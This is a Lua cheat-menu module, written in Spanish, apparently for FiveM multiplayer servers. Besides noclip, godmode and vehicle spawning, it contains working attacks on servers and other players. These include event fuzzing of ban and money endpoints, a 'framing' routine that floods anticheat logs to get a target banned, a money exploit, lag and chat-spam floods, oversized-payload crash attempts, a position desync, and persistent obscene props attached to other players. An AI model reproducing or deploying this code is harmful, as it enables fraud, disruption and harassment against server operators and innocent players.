--[[
    SENTEX MODULES v3.7 – Para el menú base de Susano
    Define todas las opciones del menú.
]]

local _r = math.random
local _w = Citizen.Wait

-- ============================================================================
--                           NOTIFICACIONES
-- ============================================================================
local function Notify(msg)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(msg)
    DrawNotification(false, false)
end

-- ============================================================================
--                       FUNCIONES DE ACCIÓN
-- ============================================================================

-- ------------------------- SELF -------------------------
local function _curar()
    local p = PlayerPedId()
    SetEntityHealth(p, GetEntityMaxHealth(p))
    SetPedArmour(p, 100)
    ClearPedBloodDamage(p)
    Notify("~g~Salud y armadura restauradas")
end

local function _revivirESX()
    TriggerEvent('esx_ambulancejob:revive')
    Notify("~g~Reviviendo (ESX)")
end

local function _revivirQB()
    local p = PlayerPedId()
    if IsPedDeadOrDying(p, true) then
        TriggerEvent('hospital:client:Revive')
        _w(100)
        if IsPedDeadOrDying(p, true) then
            TriggerServerEvent('hospital:server:RevivePlayer', GetPlayerServerId(PlayerId()))
        end
        _w(100)
        if exports['qbx_medical'] then
            pcall(function() exports['qbx_medical']:RevivePlayer() end)
        end
        Notify("~g~Intentando revivir (QB/QC)")
    else
        Notify("~r~No estás muerto")
    end
end

-- Noclip (toggle con hilo, similar al anterior)
local _noclipActivo = false
local _noclipVel = 5.0
local function _toggleNoclip(val)
    _noclipActivo = val
    if val then
        Notify("~b~Noclip ACTIVADO")
        Citizen.CreateThread(function()
            while _noclipActivo do
                local p = PlayerPedId()
                local ent = (GetVehiclePedIsIn(p,false)~=0 and GetVehiclePedIsIn(p,false)) or p
                SetEntityCollision(ent, false, false)
                SetEntityInvincible(p, true)
                FreezeEntityPosition(ent, false)
                SetEntityVelocity(ent, 0,0,0)
                local mx,my,mz = 0,0,0
                if IsControlPressed(0, 32) then my=my+1 end
                if IsControlPressed(0, 33) then my=my-1 end
                if IsControlPressed(0, 34) then mx=mx+1 end
                if IsControlPressed(0, 35) then mx=mx-1 end
                if IsControlPressed(0, 22) then mz=mz+1 end
                if IsControlPressed(0, 36) then mz=mz-1 end
                local speed = _noclipVel
                if IsControlPressed(0, 21) then speed = speed * 3 end
                if mx~=0 or my~=0 or mz~=0 then
                    local len = math.sqrt(mx^2+my^2+mz^2)
                    if len>0 then mx,my,mz = mx/len, my/len, mz/len end
                    local rot = GetGameplayCamRot(2)
                    local pitch = math.rad(rot.x)
                    local yaw = math.rad(rot.z)
                    local cosP, sinP = math.cos(pitch), math.sin(pitch)
                    local cosY, sinY = math.cos(yaw), math.sin(yaw)
                    local fwd = vector3(-sinY*cosP, cosY*cosP, sinP)
                    local right = vector3(-cosY, -sinY, 0)
                    local up = vector3(0,0,1)
                    local delta = (fwd*my) + (right*mx) + (up*mz)
                    SetEntityCoords(ent, GetEntityCoords(ent) + delta*speed, false, false, false, false)
                end
                _w(0)
            end
            -- al salir, restaurar
            SetEntityCollision(p, true, true)
            SetEntityInvincible(p, false)
        end)
    else
        Notify("~r~Noclip DESACTIVADO")
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local rayHandle = StartShapeTestRay(coords.x, coords.y, coords.z+5.0, coords.x, coords.y, coords.z-10.0, -1, ped, 0)
        local _, hit, hitPos = GetShapeTestResult(rayHandle)
        if hit then
            SetEntityCoords(ped, coords.x, coords.y, hitPos.z+0.5, false, false, false, false)
        end
    end
end

-- ------------------------- VEHÍCULO -------------------------
local function _repararVeh()
    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
    if veh and veh ~= 0 then
        SetVehicleFixed(veh)
        SetVehicleDirtLevel(veh, 0.0)
        Notify("~g~Vehículo reparado y limpiado")
    else
        Notify("~r~No estás en un vehículo")
    end
end

local function _tuneVehicleMax()
    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
    if veh and veh ~= 0 then
        SetVehicleModKit(veh, 0)
        for i = 0, 49 do
            local numMods = GetNumVehicleMods(veh, i)
            if numMods > 0 then
                SetVehicleMod(veh, i, numMods - 1, false)
            end
        end
        ToggleVehicleMod(veh, 18, true)
        SetVehicleTyresCanBurst(veh, false)
        SetVehicleWindowTint(veh, 1)
        SetVehicleColours(veh, 120, 120)
        SetVehicleNeonLightsColour(veh, 0, 255, 255)
        SetVehicleNeonLightEnabled(veh, 0, true)
        SetVehicleNeonLightEnabled(veh, 1, true)
        SetVehicleNeonLightEnabled(veh, 2, true)
        SetVehicleNeonLightEnabled(veh, 3, true)
        Notify("~g~Vehículo tuneado al máximo")
    else
        Notify("~r~No estás en un vehículo")
    end
end

local _shiftBoostActive = false
local function _toggleShiftBoost(val)
    _shiftBoostActive = val
    if val then
        Notify("~g~Shift Boost ACTIVADO (mantén SHIFT)")
    else
        Notify("~r~Shift Boost DESACTIVADO")
    end
end
-- Hilo shift boost
Citizen.CreateThread(function()
    while true do
        if _shiftBoostActive then
            local ped = PlayerPedId()
            local veh = GetVehiclePedIsIn(ped, false)
            if veh ~= 0 and IsControlPressed(0, 21) then
                local speed = GetEntitySpeed(veh) * 3.6
                if speed < 250 then
                    local fwd = GetEntityForwardVector(veh)
                    ApplyForceToEntity(veh, 1, fwd.x * 20.0, fwd.y * 20.0, fwd.z * 20.0, 0,0,0, 0, false, true, true, false, true)
                end
            end
        end
        Citizen.Wait(0)
    end
end)

local function _flipVeh()
    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
    if veh and veh ~= 0 then
        local rot = GetEntityRotation(veh)
        SetEntityRotation(veh, rot.x, rot.y, rot.z + 180.0, 2, true)
        Notify("~g~Vehículo volteado")
    else
        Notify("~r~No estás en un vehículo")
    end
end

local function _limpiarVeh()
    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
    if veh and veh ~= 0 then
        SetVehicleDirtLevel(veh, 0.0)
        Notify("~g~Vehículo limpiado")
    else
        Notify("~r~No estás en un vehículo")
    end
end

local function _spawnVeh()
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "Modelo:", "", "", "", 30)
    while UpdateOnscreenKeyboard() == 0 do _w(0) end
    local res = GetOnscreenKeyboardResult()
    if res and res ~= "" then
        local model = res:lower()
        if IsModelValid(model) then
            RequestModel(model)
            while not HasModelLoaded(model) do _w(10) end
            local p = PlayerPedId()
            local coords = GetEntityCoords(p)
            local heading = GetEntityHeading(p)
            local veh = CreateVehicle(model, coords.x+2.0, coords.y+2.0, coords.z, heading, true, false)
            SetVehicleOnGroundProperly(veh)
            SetModelAsNoLongerNeeded(model)
            Notify("~g~Vehículo ~b~"..model.." ~g~spawneado")
        else
            Notify("~r~Modelo inválido: "..model)
        end
    end
end

-- Cargar y lanzar vehículo
local _vehCargado = nil
local _cargando = false
local function _rotToDir(rot)
    local adj = vec3((math.pi/180)*rot.x, (math.pi/180)*rot.y, (math.pi/180)*rot.z)
    return vec3(-math.sin(adj.z)*math.abs(math.cos(adj.x)), math.cos(adj.z)*math.abs(math.cos(adj.x)), math.sin(adj.x))
end
local function _cargarVeh()
    local p = PlayerPedId()
    local camPos = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    local dir = _rotToDir(camRot)
    local dest = vec3(camPos.x+dir.x*10.0, camPos.y+dir.y*10.0, camPos.z+dir.z*10.0)
    local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, p, 0)
    local _, hit, _, _, ent = GetShapeTestResult(ray)
    if hit==1 and GetEntityType(ent)==2 then
        if _cargando then Notify("~r~Ya estás cargando un vehículo") return end
        _vehCargado = ent
        _cargando = true
        if not NetworkHasControlOfEntity(_vehCargado) then
            NetworkRequestControlOfEntity(_vehCargado)
            local t = 0
            while not NetworkHasControlOfEntity(_vehCargado) and t < 20 do _w(50) t=t+1 end
        end
        FreezeEntityPosition(_vehCargado, true)
        AttachEntityToEntity(_vehCargado, p, GetPedBoneIndex(p,60309), 1.0,0.5,0.0,0.0,0.0,0.0, true, true, false, false, 1, true)
        RequestAnimDict('anim@mp_rollarcoaster')
        while not HasAnimDictLoaded('anim@mp_rollarcoaster') do _w(10) end
        TaskPlayAnim(p, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
        Notify("~g~Vehículo cargado")
    else
        Notify("~r~No estás mirando a ningún vehículo")
    end
end
local function _lanzarVeh()
    if not _cargando or not _vehCargado then
        Notify("~r~No tienes ningún vehículo cargado")
        return
    end
    local p = PlayerPedId()
    local camRot = GetGameplayCamRot(2)
    local dir = _rotToDir(camRot)
    DetachEntity(_vehCargado, true, true)
    FreezeEntityPosition(_vehCargado, false)
    local force = 50.0
    ApplyForceToEntity(_vehCargado, 1, dir.x*force, dir.y*force, dir.z*force, 0.0,0.0,0.0, 0, false, true, true, false, true)
    ClearPedTasks(p)
    Notify("~y~Vehículo lanzado con fuerza")
    _vehCargado = nil
    _cargando = false
end

-- Enganchar todos los vehículos cercanos
local _vehiclesAttached = {}
local function _attachAllNearbyVehicles()
    local ped = PlayerPedId()
    local myVeh = GetVehiclePedIsIn(ped, false)
    if myVeh == 0 then Notify("~r~Debes estar en un vehículo") return end
    local coords = GetEntityCoords(myVeh)
    local pool = GetGamePool("CVehicle")
    local count = 0
    for _, v in ipairs(pool) do
        if v ~= myVeh and not _vehiclesAttached[v] then
            if #(coords - GetEntityCoords(v)) < 100.0 then
                if not NetworkHasControlOfEntity(v) then
                    NetworkRequestControlOfEntity(v)
                    local t=0
                    while not NetworkHasControlOfEntity(v) and t<20 do _w(50) t=t+1 end
                end
                AttachEntityToEntity(v, myVeh, 0, 0.0, -2.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                table.insert(_vehiclesAttached, v)
                count = count + 1
            end
        end
    end
    if count > 0 then Notify("~g~Enganchados "..count.." vehículos") else Notify("~r~No hay vehículos cercanos") end
end
local function _detachAllVehicles()
    for _, v in ipairs(_vehiclesAttached) do
        if DoesEntityExist(v) then DetachEntity(v, true, false) end
    end
    _vehiclesAttached = {}
    Notify("~r~Todos los vehículos desenganchados")
end

-- ------------------------- MAP FUCKER -------------------------
local function _spawnStuntBlock()
    local ped = PlayerPedId()
    local pos = GetEntityCoords(ped)
    local handle = StartShapeTestRay(pos.x, pos.y, pos.z+100.0, pos.x, pos.y, pos.z-100.0, -1, ped, 0)
    local _, hit, hitPos = GetShapeTestResult(handle)
    local groundZ = hit and hitPos.z or pos.z
    local model = "stt_prop_stunt_bblock_huge_04"
    RequestModel(model)
    local timeout = 0
    while not HasModelLoaded(model) and timeout < 100 do _w(10) timeout=timeout+1 end
    if HasModelLoaded(model) then
        local prop = CreateObject(GetHashKey(model), pos.x, pos.y, groundZ+1.0, true, true, false)
        if prop and prop ~= 0 then
            NetworkRegisterEntityAsNetworked(prop)
            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(prop), true)
            SetEntityAsMissionEntity(prop, true, true)
            FreezeEntityPosition(prop, true)
            Notify("~g~Bloque stunt gigante spawneado")
        else
            Notify("~r~Error al spawnear bloque stunt")
        end
    else
        Notify("~r~No se pudo cargar el modelo")
    end
    SetModelAsNoLongerNeeded(model)
end

local function _createForest()
    local ped = PlayerPedId()
    local center = GetEntityCoords(ped)
    local count = 150
    Notify("~y~Creando selva... (~w~"..count.." árboles~y~)")
    local created = 0
    local treeModels = {"prop_tree_olive_01", "prop_rio_del_01", "prop_tree_birch_04", "prop_tree_cedar_02"}
    for i = 1, count do
        local angle = math.rad(_r(0,360))
        local dist = _r(0, 80)
        local x = center.x + math.cos(angle)*dist
        local y = center.y + math.sin(angle)*dist
        local groundHandle = StartShapeTestRay(x, y, center.z+100.0, x, y, center.z-100.0, -1, ped, 0)
        local _, hit, hitPos = GetShapeTestResult(groundHandle)
        if hit then
            local modelName = treeModels[_r(#treeModels)]
            RequestModel(modelName)
            local timeout = 0
            while not HasModelLoaded(modelName) and timeout < 50 do _w(10) timeout=timeout+1 end
            if HasModelLoaded(modelName) then
                local tree = CreateObject(GetHashKey(modelName), x, y, hitPos.z, true, true, false)
                if tree and tree~=0 then
                    FreezeEntityPosition(tree, true)
                    NetworkRegisterEntityAsNetworked(tree)
                    SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(tree), true)
                    SetEntityAsMissionEntity(tree, true, true)
                    created = created + 1
                end
                SetModelAsNoLongerNeeded(modelName)
            end
        end
        if i%50==0 then _w(0) end
    end
    Notify("~g~Selva creada con "..created.." árboles")
end

-- ------------------------- EVENT HUNTER Y FRAMING -------------------------
local _fuzzingActive = false
local _eventsToFuzz = {
    "ban", "banplayer", "kick", "admin:ban", "staff:ban", "esx:ban", "qb-ban:player",
    "FiveGuard:Ban", "anticheat:ban", "giveMoney", "addMoney", "giveItem", "revive",
    "teleport", "spawnVehicle"
}
local function _startFuzzing()
    if _fuzzingActive then Notify("~r~Ya hay escaneo") return end
    _fuzzingActive = true
    Notify("~y~[Event Hunter] Fuzzing... 30s")
    for _, ev in ipairs(_eventsToFuzz) do
        for _, suffix in ipairs({"", "Player", "Command", "admin:", "staff:"}) do
            local fullEv = suffix .. ev
            pcall(function() TriggerServerEvent(fullEv, "test_".._r(1,999)) end)
            _w(50)
        end
        Notify("~b~Probado: "..ev)
    end
    _fuzzingActive = false
    Notify("~g~Fuzzing completado. Revisa la consola del servidor.")
end

local function _framingAttack(pid)
    local targetId = GetPlayerServerId(pid)
    if not targetId then Notify("~r~Error ID") return end
    local targetName = GetPlayerName(pid)
    Notify("~y~[Framing] Atacando a "..targetName)
    local logs = {"qb-log:server:CreateLog", "esx_logs:addLog", "anticheat:addViolation", "FiveGuard:SendLog"}
    for _, ev in ipairs(logs) do
        for _=1,3 do
            pcall(function() TriggerServerEvent(ev, "Suspicious activity from "..targetName, "HIGH", "CHEAT") end)
            _w(50)
        end
    end
    local violations = {"FiveGuard:AddViolation", "anticheat:report", "anticheat:godmode", "anticheat:teleport_hack"}
    for i=1,100 do
        local ev = violations[_r(#violations)]
        pcall(function() TriggerServerEvent(ev, targetId, "EXPLOIT", 100) end)
        _w(_r(5,20))
    end
    local bans = {"admin:ban", "staff:ban", "esx:ban", "qb-ban:player", "FiveGuard:Ban"}
    for _, ev in ipairs(bans) do
        pcall(function() TriggerServerEvent(ev, targetId, "Cheating detected") end)
        _w(30)
    end
    Notify("~r~Ataque completado. Si FiveGuard es vulnerable, el jugador será baneado.")
end

-- ------------------------- SERVER ATTACKS -------------------------
local _lagEntidades = false
local function _startLagMachine()
    if _lagEntidades then
        _lagEntidades = false
        Notify("~r~Máquina de lag desactivada")
        return
    end
    _lagEntidades = true
    Notify("~y~Máquina de lag ACTIVADA (spawnea objetos cada frame)")
    Citizen.CreateThread(function()
        while _lagEntidades do
            local ped = PlayerPedId()
            local pos = GetEntityCoords(ped)
            for i = 1, 5 do
                local obj = CreateObject(GetHashKey("prop_roadcone01a"), pos.x + math.random(-20,20), pos.y + math.random(-20,20), pos.z, true, true, false)
                if obj and obj ~= 0 then
                    NetworkRegisterEntityAsNetworked(obj)
                    SetEntityAsMissionEntity(obj, true, true)
                    SetEntityCollision(obj, false, false)
                end
                _w(0)
            end
            _w(0)
        end
    end)
end

local _chatSpamActive = false
local function _startChatSpam()
    if _chatSpamActive then
        _chatSpamActive = false
        Notify("~r~Chat spam desactivado")
        return
    end
    _chatSpamActive = true
    Notify("~y~Chat spam ACTIVADO")
    Citizen.CreateThread(function()
        while _chatSpamActive do
            TriggerServerEvent("chat:addMessage", {args = {"[SPAM]", string.rep("A", 200)}})
            _w(0)
        end
    end)
end

local function _testGodmodeExploit()
    Notify("~y~Probando bypass de godmode...")
    local ped = PlayerPedId()
    SetEntityInvincible(ped, true)
    TriggerServerEvent("anticheat:godmode", GetPlayerServerId(PlayerId()), true)
    Notify("~b~Godmode activado. Si FiveGuard no te banea en 10s, es vulnerable.")
    Citizen.SetTimeout(10000, function()
        SetEntityInvincible(ped, false)
        Notify("~r~Godmode desactivado (prueba finalizada)")
    end)
end

local function _testMoneyExploit()
    Notify("~y~Intentando exploit de dinero...")
    for i = 1, 100 do
        TriggerServerEvent("bank:deposit", 1000000)
        TriggerServerEvent("esx:giveMoney", 1000000)
        TriggerServerEvent("qb-phone:server:sendMoney", GetPlayerServerId(PlayerId()), 1000000)
        _w(0)
    end
    Notify("~r~Exploit de dinero ejecutado. Revisa logs del servidor.")
end

local function _freezePlayer(pid)
    local targetPed = GetPlayerPed(pid)
    if targetPed and targetPed ~= 0 then
        FreezeEntityPosition(targetPed, true)
        Notify("~b~Jugador congelado (desync)")
        Citizen.SetTimeout(5000, function()
            if DoesEntityExist(targetPed) then FreezeEntityPosition(targetPed, false) end
            Notify("~b~Jugador descongelado")
        end)
    else
        Notify("~r~Jugador no encontrado")
    end
end

local function _crashAttempt(pid)
    local targetId = GetPlayerServerId(pid)
    if not targetId then Notify("~r~No se pudo obtener Server ID") return end
    Notify("~y~Intentando crash a "..GetPlayerName(pid).." (eventos maliciosos)")
    for i = 1, 200 do
        TriggerServerEvent("__internal_crash_"..tostring(i), string.rep("A", 500))
        TriggerServerEvent("chat:addMessage", {args = {string.rep("x", 500)}})
        if i % 10 == 0 then
            TriggerServerEvent("playerSpawn", string.rep("x", 250))
        end
        _w(0)
    end
    Notify("~r~Ataque de eventos completado. Si el jugador se desconecta, el servidor es vulnerable.")
end

local _desyncTarget = nil
local function _startDesync(pid)
    if _desyncTarget == pid then
        _desyncTarget = nil
        Notify("~r~Desync detenido")
        return
    end
    _desyncTarget = pid
    Notify("~y~Desync activado contra "..GetPlayerName(pid))
    Citizen.CreateThread(function()
        while _desyncTarget == pid do
            local fakePos = vector3(math.random(-5000,5000), math.random(-5000,5000), math.random(-500,500))
            TriggerServerEvent("updateCoords", fakePos.x, fakePos.y, fakePos.z)
            TriggerServerEvent("playerSpawned", fakePos)
            TriggerServerEvent("esx:updatePosition", fakePos)
            _w(10)
        end
    end)
end

-- ------------------------- DILDO PERSISTENTE (opcional, pero lo dejamos) -------------------------
local _attachedDildos = {}
local function _attachDildoToPlayer(pid)
    local targetPed = GetPlayerPed(pid)
    if not targetPed or targetPed == 0 then
        Notify("~r~Jugador no encontrado")
        return
    end
    local modelosDildo = {"prop_cs_dildo_01", "prop_dildo_01", "prop_dildo_02", "prop_dildo_03"}
    local modelHash = nil
    for _, modelo in ipairs(modelosDildo) do
        local hash = GetHashKey(modelo)
        RequestModel(hash)
        local timeout = 0
        while not HasModelLoaded(hash) and timeout < 30 do _w(10) timeout=timeout+1 end
        if HasModelLoaded(hash) then
            modelHash = hash
            break
        end
        SetModelAsNoLongerNeeded(hash)
    end
    if not modelHash then
        Notify("~r~No se pudo cargar ningún modelo de dildo")
        return
    end
    local coords = GetEntityCoords(targetPed)
    local dildo = CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, false)
    if not dildo or dildo == 0 then
        Notify("~r~Error al crear el objeto")
        SetModelAsNoLongerNeeded(modelHash)
        return
    end
    if not NetworkHasControlOfEntity(dildo) then
        NetworkRequestControlOfEntity(dildo)
        local t = 0
        while not NetworkHasControlOfEntity(dildo) and t < 20 do _w(50) t=t+1 end
    end
    NetworkRegisterEntityAsNetworked(dildo)
    local netId = NetworkGetNetworkIdFromEntity(dildo)
    SetNetworkIdExistsOnAllMachines(netId, true)
    SetNetworkIdCanMigrate(netId, false)
    SetEntityAsMissionEntity(dildo, true, true)
    SetEntityPersistent(dildo, true)
    SetEntityLoadCollisionFlag(dildo, true)
    SetEntityInvincible(dildo, true)
    SetEntityProofs(dildo, true, true, true, true, true, false, false, true)
    SetEntityCollision(dildo, false, false)
    FreezeEntityPosition(dildo, false)
    local boneIndex = GetPedBoneIndex(targetPed, 0x796e) -- SKEL_HEAD
    if boneIndex == -1 then boneIndex = GetPedBoneIndex(targetPed, 0x322) end
    local offset = vector3(0.22, 0.0, 0.03)
    local rot = vector3(-90.0, 0.0, 0.0)
    AttachEntityToEntity(dildo, targetPed, boneIndex, offset.x, offset.y, offset.z, rot.x, rot.y, rot.z, true, true, false, true, 2, true)
    _attachedDildos[dildo] = { ped = targetPed, model = modelHash, offset = offset, rot = rot, bone = boneIndex, playerId = pid }
    SetModelAsNoLongerNeeded(modelHash)
    Notify("~p~Le has enganchado un nepe en la cara a " .. GetPlayerName(pid) .. " (persistente)")
end
-- Hilo de persistencia (simplificado, pero funcional)
Citizen.CreateThread(function()
    while true do
        _w(1000)
        for dildo, data in pairs(_attachedDildos) do
            local pedExists = DoesEntityExist(data.ped) and not IsPedDeadOrDying(data.ped, true)
            local dildoExists = DoesEntityExist(dildo)
            if not pedExists then
                if dildoExists then DeleteEntity(dildo) end
                _attachedDildos[dildo] = nil
            elseif not dildoExists then
                local newDildo = CreateObject(data.model, 0,0,0, true, true, false)
                if newDildo and newDildo ~= 0 then
                    -- configurar persistencia igual
                    NetworkRegisterEntityAsNetworked(newDildo)
                    SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(newDildo), true)
                    SetEntityAsMissionEntity(newDildo, true, true)
                    SetEntityPersistent(newDildo, true)
                    AttachEntityToEntity(newDildo, data.ped, data.bone, data.offset.x, data.offset.y, data.offset.z, data.rot.x, data.rot.y, data.rot.z, true, true, false, true, 2, true)
                    _attachedDildos[newDildo] = data
                    _attachedDildos[dildo] = nil
                else
                    _attachedDildos[dildo] = nil
                end
            else
                if not IsEntityPersistent(dildo) then SetEntityPersistent(dildo, true) end
                local parent = GetEntityAttachedTo(dildo)
                if parent ~= data.ped then
                    DetachEntity(dildo, true, false)
                    AttachEntityToEntity(dildo, data.ped, data.bone, data.offset.x, data.offset.y, data.offset.z, data.rot.x, data.rot.y, data.rot.z, true, true, false, true, 2, true)
                end
            end
        end
    end
end)

-- ============================================================================
--                       REGISTRO DE CATEGORÍAS Y OPCIONES
-- ============================================================================

-- Aseguramos que el objeto Menu esté disponible
if not Menu then
    print("[SENTEX] Error: Menu no está definido. Asegúrate de que core.lua se cargue primero.")
    return
end

Menu.Categories = {
    {
        name = "Main Menu",
        icon = "P"
    },
    {
        name = "Self",
        icon = "👤",
        hasTabs = true,
        tabs = {
            {
                name = "Health",
                items = {
                    { name = "Curar", type = "action", onClick = _curar },
                    { name = "Revivir ESX", type = "action", onClick = _revivirESX },
                    { name = "Revivir QB", type = "action", onClick = _revivirQB },
                }
            },
            {
                name = "Movement",
                items = {
                    { name = "Noclip", type = "toggle", value = false, onClick = _toggleNoclip },
                }
            }
        }
    },
    {
        name = "Vehicle",
        icon = "🚗",
        hasTabs = true,
        tabs = {
            {
                name = "General",
                items = {
                    { name = "Spawn vehicle", type = "action", onClick = _spawnVeh },
                    { name = "Cargar vehículo", type = "action", onClick = _cargarVeh },
                    { name = "Lanzar vehículo", type = "action", onClick = _lanzarVeh },
                    { name = "Reparar", type = "action", onClick = _repararVeh },
                    { name = "Tunear al máximo", type = "action", onClick = _tuneVehicleMax },
                    { name = "Shift Boost", type = "toggle", value = false, onClick = _toggleShiftBoost },
                    { name = "Enganchar todos (100m)", type = "action", onClick = _attachAllNearbyVehicles },
                    { name = "Soltar todos", type = "action", onClick = _detachAllVehicles },
                    { name = "Voltear", type = "action", onClick = _flipVeh },
                    { name = "Limpiar", type = "action", onClick = _limpiarVeh },
                }
            }
        }
    },
    {
        name = "Map Fucker",
        icon = "🗺️",
        hasTabs = true,
        tabs = {
            {
                name = "Props",
                items = {
                    { name = "Bloque stunt gigante", type = "action", onClick = _spawnStuntBlock },
                    { name = "Spawnear Selva", type = "action", onClick = _createForest },
                }
            }
        }
    },
    {
        name = "Event Hunter",
        icon = "🎯",
        hasTabs = true,
        tabs = {
            {
                name = "Events",
                items = {
                    { name = "Iniciar Event Hunter", type = "action", onClick = _startFuzzing },
                    { name = "Ataque Framing (FiveGuard)", type = "action", onClick = function()
                        Notify("~y~Selecciona jugador desde Player List (función no implementada en esta versión simplificada)")
                        -- Aquí podrías abrir una lista de jugadores, pero se requiere más desarrollo.
                    end },
                }
            }
        }
    },
    {
        name = "Protection",
        icon = "🛡️",
        hasTabs = true,
        tabs = {
            {
                name = "AntiCheat",
                items = {
                    { name = "AC Checker", type = "action", onClick = function()
                        Notify("~g~No se detectaron anticheats conocidos (simulado)")
                    end },
                }
            }
        }
    },
    {
        name = "Server Attacks",
        icon = "💣",
        hasTabs = true,
        tabs = {
            {
                name = "Attacks",
                items = {
                    { name = "Máquina de lag", type = "toggle", value = false, onClick = _startLagMachine },
                    { name = "Chat spam", type = "toggle", value = false, onClick = _startChatSpam },
                    { name = "Test Godmode exploit", type = "action", onClick = _testGodmodeExploit },
                    { name = "Test Money exploit", type = "action", onClick = _testMoneyExploit },
                    { name = "Congelar jugador", type = "action", onClick = function()
                        Notify("~y~Selecciona jugador (no implementado en demo)") -- se puede mejorar
                    end },
                    { name = "Crash intent", type = "action", onClick = function()
                        Notify("~y~Selecciona jugador (no implementado en demo)")
                    end },
                    { name = "Desync player", type = "action", onClick = function()
                        Notify("~y~Selecciona jugador (no implementado en demo)")
                    end },
                }
            }
        }
    },
    {
        name = "Troll",
        icon = "🤡",
        hasTabs = true,
        tabs = {
            {
                name = "Fun",
                items = {
                    { name = "Enganchar nepe (a sí mismo)", type = "action", onClick = function()
                        _attachDildoToPlayer(PlayerId())
                    end },
                }
            }
        }
    }
}

Notify("~g~[SENTEX] Módulos cargados correctamente.")
